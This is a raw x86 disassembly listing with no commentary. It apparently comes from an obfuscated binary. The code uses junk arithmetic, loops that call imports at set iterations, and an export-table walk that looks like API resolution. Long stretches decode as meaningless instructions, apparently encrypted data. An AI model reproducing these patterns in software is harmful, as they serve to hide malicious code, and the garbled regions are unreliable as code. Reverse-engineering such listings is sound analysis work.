  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4337a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4337a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4337eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4337eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4337eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4337eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4337eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4337eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4337eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4337eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433733,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433733
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433733,esi
  40c2c4:	cmp    DWORD PTR ds:0x433733,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433733,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4337f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4337eb
  40c301:	adc    DWORD PTR ds:0x4337fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43374b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433787
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4337e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43372f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4337a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433733,0x433767
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4337ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4337ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4337ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4337ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4337ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4337ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4337ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4337ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43376b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4337ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4337ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43382b,0x43383b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4337af,0x4337bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4337c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433737,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43372b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43372f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433723,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4337e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4337f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4337a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4337eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4337eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4337eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4337eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4337eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4337eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4337eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4337eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4337eb
  40c4ce:	and    esi,DWORD PTR ds:0x4337ef
  40c4d4:	mov    DWORD PTR ds:0x4337eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4337bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433783,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43376f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4337fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4337eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4337f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x196e5658
  40c577:	mov    DWORD PTR [edi],ebp
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	dec    eax
  40c582:	out    0x72,eax
  40c584:	mov    DWORD PTR [esi+esi*8+0x4a58d21a],0xa02df0f3
  40c58f:	jae    0x40c5e1
  40c591:	data16 jno 0x40c54f
  40c594:	mov    DWORD PTR [ebx-0x18f46068],edx
  40c59a:	test   al,0x75
  40c59c:	sahf   
  40c59d:	push   ss
  40c59e:	outs   dx,DWORD PTR ds:[esi]
  40c59f:	mov    al,ds:0x5fa8d8c
  40c5a4:	cmp    al,0xa8
  40c5a6:	into   
  40c5a7:	popa   
  40c5a8:	daa    
  40c5a9:	sbb    edi,DWORD PTR ds:0xee0253b7
  40c5af:	mov    esi,0x47b220dc
  40c5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5b5:	push   0xffffffb9
  40c5b7:	std    
  40c5b8:	mov    cl,0x3
  40c5ba:	aas    
  40c5bb:	sar    DWORD PTR [eax-0x2abafc8b],1
  40c5c1:	inc    ebx
  40c5c2:	out    dx,al
  40c5c3:	lahf   
  40c5c4:	std    
  40c5c5:	sub    esi,DWORD PTR [esi-0x2]
  40c5c8:	xchg   ebx,eax
  40c5c9:	repnz xchg esi,eax
  40c5cb:	sbb    al,0x79
  40c5cd:	mov    dl,0x3c
  40c5cf:	mov    ebx,DWORD PTR [ebx]
  40c5d1:	(bad)  
  40c5d2:	out    0x92,al
  40c5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5d5:	int3   
  40c5d6:	stos   BYTE PTR es:[edi],al
  40c5d7:	xor    ebx,DWORD PTR [ebx+0x61875d95]
  40c5dd:	mov    bh,0x3
  40c5df:	retf   0xeec4
  40c5e2:	ins    BYTE PTR es:[edi],dx
  40c5e3:	mov    ah,0x24
  40c5e5:	add    eax,0x4faac1b
  40c5ea:	fwait
  40c5eb:	stc    
  40c5ec:	aad    0x2d
  40c5ee:	pushf  
  40c5ef:	aad    0x50
  40c5f1:	adc    al,0x95
  40c5f3:	fs ins BYTE PTR es:[edi],dx
  40c5f5:	scas   al,BYTE PTR es:[edi]
  40c5f6:	fs das 
  40c5f8:	rcr    DWORD PTR [esi+esi*2-0x6],1
  40c5fc:	lahf   
  40c5fd:	add    DWORD PTR ds:0x21174270,ebx
  40c603:	sub    DWORD PTR [edx],esp
  40c605:	std    
  40c606:	sub    dh,dh
  40c608:	cmp    cl,BYTE PTR [edx+0x47]
  40c60b:	ds xor eax,0xa60e2ab6
  40c611:	fiadd  DWORD PTR [ecx-0x71]
  40c614:	push   edi
  40c615:	dec    ecx
  40c616:	and    esi,ebp
  40c618:	mov    edi,0x92473a93
  40c61d:	mov    al,0x87
  40c61f:	xchg   al,bl
  40c621:	ret    
  40c622:	jmp    0xee43:0xf80e3791
  40c629:	in     eax,0xe
  40c62b:	push   ebp
  40c62c:	xchg   edx,edx
  40c62e:	scas   eax,DWORD PTR es:[edi]
  40c62f:	jle    0x40c69d
  40c631:	fwait
  40c632:	mov    ah,0xe5
  40c634:	fldz   
  40c636:	fcomp  QWORD PTR [esi+0x6f]
  40c639:	and    DWORD PTR [esi+eiz*1+0x20],esi
  40c63d:	in     eax,0x9f
  40c63f:	mov    eax,0x3389b315
  40c644:	mov    ecx,0x15b889bc
  40c649:	out    dx,al
  40c64a:	in     al,dx
  40c64b:	jns    0x40c662
  40c64d:	fwait
  40c64e:	push   ecx
  40c64f:	(bad)  
  40c650:	call   0x998ec089
  40c655:	dec    esi
  40c656:	bound  esi,QWORD PTR [edi-0x12]
  40c659:	in     eax,dx
  40c65a:	fcmovu st,st(0)
  40c65c:	adc    eax,0x8bb3357a
  40c661:	jo     0x40c63f
  40c663:	fidivr DWORD PTR [edx]
  40c665:	outs   dx,DWORD PTR ds:[esi]
  40c666:	mov    ch,0x44
  40c668:	push   eax
  40c669:	xor    al,0x73
  40c66b:	jmp    0xcd54:0xde5f262a
  40c672:	and    al,BYTE PTR [ebx]
  40c674:	push   edx
  40c675:	cmp    BYTE PTR [eax+0x37],cl
  40c678:	fsubr  DWORD PTR ds:0x9371a56d
  40c67e:	in     eax,0xaf
  40c680:	adc    al,0xb9
  40c682:	dec    edx
  40c683:	addr16 dec ecx
  40c685:	sub    ebx,DWORD PTR [edx-0x1a04ca0f]
  40c68b:	and    DWORD PTR [edi-0x14],esp
  40c68e:	jo     0x40c6e3
  40c690:	xchg   edx,eax
  40c691:	(bad)  
  40c692:	pop    edx
  40c693:	pop    ecx
  40c694:	cld    
  40c695:	aad    0xf
  40c697:	les    esi,FWORD PTR [ebx+0x67bb658c]
  40c69d:	pop    ecx
  40c69e:	xchg   DWORD PTR [edi],esi
  40c6a0:	iret   
  40c6a1:	adc    ah,BYTE PTR [edi-0x4bfde7a4]
  40c6a7:	rcr    BYTE PTR ds:[ebp+0x49efab3],1
  40c6ae:	test   al,0x9
  40c6b0:	enter  0x7e9d,0x1a
  40c6b4:	pop    edi
  40c6b5:	dec    ecx
  40c6b6:	cdq    
  40c6b7:	push   esi
  40c6b8:	in     eax,0xcb
  40c6ba:	fs push ebp
  40c6bc:	jno    0x40c70f
  40c6be:	sbb    al,0xef
  40c6c0:	mov    dh,0x85
  40c6c2:	xchg   esp,eax
  40c6c3:	leave  
  40c6c4:	bound  esp,QWORD PTR [ebx]
  40c6c6:	les    ebx,FWORD PTR [ebx-0x61]
  40c6c9:	push   cs
  40c6ca:	popa   
  40c6cb:	test   DWORD PTR [ebx],esi
  40c6cd:	jmp    0xc5de:0x4d37c865
  40c6d4:	sbb    ebx,ebx
  40c6d6:	fwait
  40c6d7:	push   esp
  40c6d8:	sbb    al,0x81
  40c6da:	sti    
  40c6db:	xchg   edi,eax
  40c6dc:	in     eax,0xd0
  40c6de:	(bad)  
  40c6e0:	outs   dx,BYTE PTR ds:[esi]
  40c6e1:	jne    0x40c731
  40c6e3:	xor    esp,DWORD PTR [ebp-0x5b]
  40c6e6:	outs   dx,BYTE PTR ds:[esi]
  40c6e7:	ja     0x40c697
  40c6e9:	outs   dx,BYTE PTR ds:[esi]
  40c6ea:	xor    DWORD PTR [ebp-0x13aec713],ebx
  40c6f0:	repz pop ecx
  40c6f2:	jae    0x40c73a
  40c6f4:	shr    DWORD PTR [ebx+0x380d0c0b],cl
  40c6fa:	frstor [ebx+0x41]
  40c6fd:	jge    0x40c774
  40c6ff:	sub    ecx,DWORD PTR [edx-0x24]
  40c702:	cmp    dh,BYTE PTR [eax-0x17ff59fc]
  40c708:	dec    edx
  40c709:	mov    ds:0x9144f3d0,al
  40c70e:	and    eax,0xa6b42e71
  40c713:	outs   dx,DWORD PTR ds:[esi]
  40c714:	not    BYTE PTR [eax]
  40c716:	adc    DWORD PTR [esi-0x10950247],esi
  40c71c:	sbb    eax,0xd06d6b54
  40c721:	adc    dh,BYTE PTR [edx+0x29]
  40c724:	outs   dx,DWORD PTR ds:[esi]
  40c725:	adc    esp,esi
  40c727:	ror    DWORD PTR [esi-0x44],1
  40c72a:	cmp    al,BYTE PTR [ecx-0x67]
  40c72d:	test   BYTE PTR [ecx-0x3719bbd6],ah
  40c733:	jl     0x40c6fe
  40c735:	dec    ebx
  40c736:	or     ecx,ecx
  40c738:	(bad)  
  40c73b:	int3   
  40c73c:	mov    ebx,0xf7836a57
  40c741:	jb     0x40c753
  40c743:	xchg   ebp,eax
  40c744:	enter  0xf69f,0xee
  40c748:	push   ss
  40c749:	push   0x63
  40c74b:	and    ecx,edi
  40c74d:	push   ebp
  40c74e:	pop    ds
  40c74f:	sbb    BYTE PTR [ebx-0x64fd864b],bh
  40c755:	jl     0x40c6ec
  40c757:	mov    bh,0xdb
  40c759:	or     BYTE PTR [ebx+0x332eeaa9],cl
  40c75f:	sub    eax,0xa29f0937
  40c764:	push   esi
  40c765:	dec    eax
  40c766:	sub    dl,cl
  40c768:	sub    bl,al
  40c76a:	(bad)  
  40c76b:	xchg   edx,eax
  40c76c:	xchg   ebp,eax
  40c76d:	xor    al,0x5e
  40c76f:	mov    dl,0xf
  40c771:	mov    esi,0x679d824a
  40c776:	dec    edx
  40c777:	dec    edx
  40c778:	and    eax,0x4ce0fd9a
  40c77d:	loope  0x40c722
  40c77f:	sub    al,0xc3
  40c781:	mul    BYTE PTR [ecx-0x11d6ca31]
  40c787:	enter  0x4021,0x29
  40c78b:	lods   eax,DWORD PTR ds:[esi]
  40c78c:	cwde   
  40c78d:	mov    edx,0xe718e819
  40c792:	pusha  
  40c793:	cmp    DWORD PTR [esi-0x63b42726],edi
  40c799:	mov    ebx,0xe30137ab
  40c79e:	xor    al,0xa0
  40c7a0:	xchg   esp,eax
  40c7a1:	(bad)  
  40c7a2:	ss jmp 0x443c:0xba3a103e
  40c7aa:	add    BYTE PTR [edi-0x39a2516a],0x7a
  40c7b1:	int    0x97
  40c7b3:	iret   
  40c7b4:	add    DWORD PTR [ebx+0x67b97396],edi
  40c7ba:	ret    0xdb90
  40c7bd:	xlat   BYTE PTR ds:[ebx]
  40c7be:	jg     0x40c75d
  40c7c0:	pop    ds
  40c7c1:	ret    0xc61c
  40c7c4:	fcom   QWORD PTR [eax]
  40c7c6:	push   edi
  40c7c7:	inc    ebp
  40c7c8:	push   ebp
  40c7c9:	fnstenv [ebp-0x332803a7]
  40c7cf:	or     dl,BYTE PTR [ecx-0x2a8359f9]
  40c7d5:	xchg   esi,eax
  40c7d6:	scas   eax,DWORD PTR es:[edi]
  40c7d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7d8:	cmp    al,BYTE PTR [eax]
  40c7da:	mov    bh,0x9c
  40c7dc:	aad    0x77
  40c7de:	cdq    
  40c7df:	push   ebx
  40c7e0:	out    0x36,eax
  40c7e2:	ficomp DWORD PTR [esi+ebx*4]
  40c7e5:	jno    0x40c79d
  40c7e7:	leave  
  40c7e8:	das    
  40c7e9:	fsqrt  
  40c7eb:	cmp    ebp,DWORD PTR ds:0x5a6591a4
  40c7f1:	(bad)  
  40c7f2:	dec    ebp
  40c7f3:	sub    eax,0xb8b29e95
  40c7f8:	jmp    0x40c867
  40c7fa:	adc    ebx,ecx
  40c7fc:	aaa    
  40c7fd:	out    dx,al
  40c7fe:	pop    ss
  40c7ff:	jmp    0x62ca754c
  40c804:	popa   
  40c805:	jae    0x40c886
  40c807:	scas   al,BYTE PTR es:[edi]
  40c808:	rol    ebx,1
  40c80a:	xlat   BYTE PTR ds:[ebx]
  40c80b:	cmp    ah,BYTE PTR [esi+ecx*1+0x52]
  40c80f:	pop    ax
  40c811:	adc    DWORD PTR [eax+0x24],edi
  40c814:	enter  0x748a,0x65
  40c818:	lock xchg esi,eax
  40c81a:	mov    al,ds:0x87a9ee73
  40c81f:	xchg   dl,bl
  40c821:	rcr    DWORD PTR [ecx+0x57],1
  40c824:	fistp  QWORD PTR [ebx+edi*8]
  40c827:	popf   
  40c828:	cld    
  40c829:	sbb    BYTE PTR [eax-0x14],bl
  40c82c:	(bad)  
  40c82d:	jg     0x40c8a3
  40c82f:	adc    DWORD PTR [edx],ebx
  40c831:	jne    0x40c81b
  40c833:	ror    BYTE PTR [ebp-0x123f30d8],cl
  40c839:	enter  0x2da5,0x6
  40c83d:	push   cs
  40c83e:	push   ebx
  40c83f:	add    al,0x23
  40c841:	xchg   esi,eax
  40c842:	clc    
  40c843:	ss and al,0xe1
  40c846:	jbe    0x40c86d
  40c848:	icebp  
  40c849:	je     0x40c87f
  40c84b:	int3   
  40c84c:	add    eax,0xbc62bad7
  40c851:	dec    edi
  40c852:	iret   
  40c853:	imul   DWORD PTR [ecx]
  40c855:	jecxz  0x40c86c
  40c857:	in     eax,0x5e
  40c859:	push   edx
  40c85a:	xchg   esp,eax
  40c85b:	push   esi
  40c85c:	inc    ebp
  40c85d:	jg     0x40c85a
  40c85f:	xor    BYTE PTR [edi+0x538803b],ch
  40c865:	addr16 in al,dx
  40c867:	xor    al,0x62
  40c869:	scas   eax,DWORD PTR es:[edi]
  40c86a:	push   esi
  40c86b:	jge    0x40c891
  40c86d:	hlt    
  40c86e:	sub    al,BYTE PTR [eax-0x1071345d]
  40c874:	(bad)  
  40c875:	push   ds
  40c876:	dec    edx
  40c877:	imul   ecx,DWORD PTR [esp+ecx*1+0x67],0xc3b04d49
  40c87f:	(bad)  
  40c880:	in     al,0xd1
  40c882:	mov    cl,0x2c
  40c884:	mov    eax,DWORD PTR [ebp-0x14]
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	push   ds
  40c8b3:	stc    
  40c8b4:	subps  xmm4,XMMWORD PTR [edi]
  40c8b7:	mov    WORD PTR [esi+0x7e],?
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	and    al,0x9b
  40c8c0:	and    bl,BYTE PTR [esi]
  40c8c2:	(bad)  
  40c8c3:	(bad)  
  40c8c5:	mov    BYTE PTR [edi+0xb8b6e83],0xe
  40c8cc:	jb     0x40c94b
  40c8ce:	sbb    eax,0x8667b300
  40c8d3:	ins    BYTE PTR es:[edi],dx
  40c8d4:	jp     0x40c8fa
  40c8d6:	cwde   
  40c8d7:	out    dx,al
  40c8d8:	(bad)  
  40c8d9:	outs   dx,DWORD PTR ds:[esi]
  40c8da:	lods   eax,DWORD PTR ds:[esi]
  40c8db:	jae    0x40c8d3
  40c8dd:	shr    DWORD PTR [ebp-0x21],1
  40c8e0:	std    
  40c8e1:	retf   
  40c8e2:	mov    dh,0xc3
  40c8e4:	xlat   BYTE PTR ds:[ebx]
  40c8e5:	stc    
  40c8e6:	not    DWORD PTR ds:[ebp-0x1c]
  40c8ea:	xor    eax,0x53db294
  40c8ef:	push   eax
  40c8f0:	cwde   
  40c8f1:	jl     0x40c93d
  40c8f3:	fbld   TBYTE PTR [eax-0x5ec3e927]
  40c8f9:	push   ebx
  40c8fa:	cmp    DWORD PTR ds:0xa7b6bde4,eax
  40c900:	data16 shr bh,0x6a
  40c904:	xor    DWORD PTR [ebx+ecx*1],0xffffff8b
  40c908:	imul   edi,DWORD PTR [esi],0x64
  40c90b:	mov    edx,0xf3d1005c
  40c910:	mov    bl,0x99
  40c912:	jno    0x40c95f
  40c914:	sub    DWORD PTR [eax-0x3b],eax
  40c917:	jbe    0x40c929
  40c919:	mov    ah,0x19
  40c91b:	dec    ebx
  40c91c:	jmp    0x2076:0x1835d114
  40c923:	pop    edi
  40c924:	and    bl,ah
  40c926:	inc    si
  40c928:	and    al,0x7f
  40c92a:	sub    BYTE PTR [eax],dh
  40c92c:	push   esp
  40c92d:	inc    ebp
  40c92e:	loopne 0x40c950
  40c930:	and    BYTE PTR [edx+eiz*8+0x1c555e29],dl
  40c937:	out    0x2,eax
  40c939:	sar    DWORD PTR [esp+esi*2],cl
  40c93c:	out    0x7d,eax
  40c93e:	or     eax,0x29227250
  40c943:	pop    ebp
  40c944:	sti    
  40c945:	mov    ch,0x8
  40c947:	aas    
  40c948:	cwde   
  40c949:	inc    edi
  40c94a:	mov    edi,0xa2f4419
  40c94f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c950:	add    cl,BYTE PTR [ebx]
  40c952:	inc    esp
  40c953:	inc    esi
  40c954:	loope  0x40c8d8
  40c956:	enter  0x95d1,0xb2
  40c95a:	push   ds
  40c95b:	xchg   esp,eax
  40c95c:	out    dx,al
  40c95d:	push   eax
  40c95e:	repz and al,0x3c
  40c961:	scas   al,BYTE PTR es:[edi]
  40c962:	sub    DWORD PTR [esi-0x653b4a45],ecx
  40c968:	and    bl,BYTE PTR [edx+ebx*2]
  40c96b:	sti    
  40c96c:	mov    ebp,0x65ffa248
  40c971:	lods   eax,DWORD PTR ds:[esi]
  40c972:	fstp   st(6)
  40c974:	out    0xa4,eax
  40c976:	cmp    ch,BYTE PTR [ebx+0x74ad5580]
  40c97c:	sub    al,0x25
  40c97e:	mov    al,0xd5
  40c980:	push   ds
  40c981:	sbb    esp,DWORD PTR [ebx+0x8]
  40c984:	or     eax,0xa13a4933
  40c989:	mov    eax,ds:0xe4e3d9ef
  40c98e:	mov    bl,0x94
  40c990:	mov    ecx,0xd76685e2
  40c995:	ror    BYTE PTR [edi],cl
  40c997:	adc    eax,0xe271d06e
  40c99c:	jmp    0x40ca1b
  40c99e:	ss and cl,cl
  40c9a1:	fisttp WORD PTR [edx]
  40c9a3:	outs   dx,DWORD PTR ds:[esi]
  40c9a4:	inc    ebx
  40c9a5:	in     eax,dx
  40c9a6:	inc    ebp
  40c9a7:	and    ecx,DWORD PTR [ebp+ebx*8-0x3d]
  40c9ab:	fwait
  40c9ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9ad:	imul   ebp,DWORD PTR [eax-0x26],0xf970bcf
  40c9b4:	fs xchg edx,eax
  40c9b6:	mov    cl,0x6d
  40c9b8:	and    esp,esp
  40c9ba:	xchg   edi,eax
  40c9bb:	xor    edi,DWORD PTR [ebp-0x2b]
  40c9be:	retf   
  40c9bf:	pop    ss
  40c9c0:	leave  
  40c9c1:	leave  
  40c9c2:	sar    DWORD PTR ds:0x63240173,1
  40c9c8:	jmp    0x40c9b7
  40c9ca:	push   esp
  40c9cb:	lock jmp 0x40ca45
  40c9ce:	adc    eax,ecx
  40c9d0:	inc    edi
  40c9d1:	cmp    eax,0x88c63377
  40c9d6:	pop    edx
  40c9d7:	out    0x32,eax
  40c9d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9da:	add    BYTE PTR [ebx],bl
  40c9dc:	jmp    0xc40a143f
  40c9e1:	xor    edx,DWORD PTR [ecx+0x8]
  40c9e4:	sub    ah,dl
  40c9e6:	push   ebp
  40c9e7:	shr    DWORD PTR [ecx-0x2b3d9c4e],cl
  40c9ed:	(bad)  
  40c9ee:	ffreep st(3)
  40c9f0:	xchg   esp,eax
  40c9f1:	push   0x3e3332f3
  40c9f6:	push   ds
  40c9f7:	aam    0xd
  40c9f9:	loop   0x40ca72
  40c9fb:	outs   dx,DWORD PTR ds:[esi]
  40c9fc:	icebp  
  40c9fd:	cmc    
  40c9fe:	ret    
  40c9ff:	push   esi
  40ca00:	js     0x40c9d4
  40ca02:	das    
  40ca03:	fs shl bl,cl
  40ca06:	imul   ecx,DWORD PTR [ebx],0x38
  40ca09:	mov    ds:0xe9d6f48,al
  40ca0e:	mov    ah,BYTE PTR [eax+0x6f10fb5]
  40ca14:	pop    ds
  40ca15:	inc    esp
  40ca16:	jb     0x40ca7a
  40ca18:	mov    edi,0x34bf491e
  40ca1d:	pop    ebp
  40ca1e:	in     al,0xd2
  40ca20:	js     0x40c9b0
  40ca22:	mov    DWORD PTR [esi+0x2b],0xfef45214
  40ca29:	adc    BYTE PTR [edi-0x59],bh
  40ca2c:	ror    BYTE PTR [ebx-0x7e],cl
  40ca2f:	lds    ebp,FWORD PTR [eax]
  40ca31:	jno    0x40ca3a
  40ca33:	test   al,0xfd
  40ca35:	or     bl,BYTE PTR [edi+eiz*1-0x6fb2063a]
  40ca3c:	mov    ch,0x87
  40ca3e:	inc    edi
  40ca3f:	cmc    
  40ca40:	sub    ch,al
  40ca42:	mov    eax,ds:0x55f7d65e
  40ca47:	pop    ebx
  40ca48:	jle    0x40c9e4
  40ca4a:	fild   QWORD PTR [ecx+0x63]
  40ca4d:	add    eax,0xeb6d16a8
  40ca52:	(bad)  
  40ca53:	cwde   
  40ca54:	test   BYTE PTR [eax],dh
  40ca56:	inc    edi
  40ca57:	call   0x636f6db
  40ca5c:	mov    ds:0xd45e3c52,al
  40ca61:	pop    eax
  40ca62:	xchg   ebx,eax
  40ca63:	pop    edx
  40ca64:	mov    esi,0xba890f05
  40ca69:	push   ss
  40ca6a:	sar    BYTE PTR [eax-0x3c18b93c],0x5d
  40ca71:	pop    ds
  40ca72:	pop    ss
  40ca73:	mov    ah,0x5
  40ca75:	pop    edi
  40ca76:	shl    DWORD PTR [edx+0x6616e249],cl
  40ca7c:	mov    cl,0x17
  40ca7e:	mov    esp,ebx
  40ca80:	test   eax,0xec1760e3
  40ca85:	mov    ah,0xa9
  40ca87:	pop    esi
  40ca88:	add    DWORD PTR [esi-0x18275fc],esp
  40ca8e:	pusha  
  40ca8f:	loope  0x40ca12
  40ca91:	cmp    al,0x3a
  40ca93:	iret   
  40ca94:	outs   dx,BYTE PTR ds:[esi]
  40ca95:	mov    eax,ds:0xd5751587
  40ca9a:	pusha  
  40ca9b:	dec    esi
  40ca9c:	div    BYTE PTR [eax-0x57]
  40ca9f:	pop    esp
  40caa0:	xlat   BYTE PTR ds:[ebx]
